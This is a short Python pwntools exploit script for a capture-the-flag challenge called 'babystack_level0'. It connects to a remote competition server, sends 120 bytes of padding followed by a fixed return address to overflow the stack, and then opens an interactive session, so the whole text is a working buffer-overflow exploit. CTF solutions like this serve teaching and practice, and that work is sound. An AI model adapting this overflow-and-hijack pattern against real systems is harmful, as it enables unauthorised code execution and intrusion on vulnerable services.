from pwn import *
io = remote("nc.thuctf.redbud.info",31753)
# io = process("./babystack_level0.elf") #本地测试
addr = p64(0x00000000004006C7)
payload = bytes('a' * 120, 'utf-8') + addr
io.sendline(payload)
io.interactive()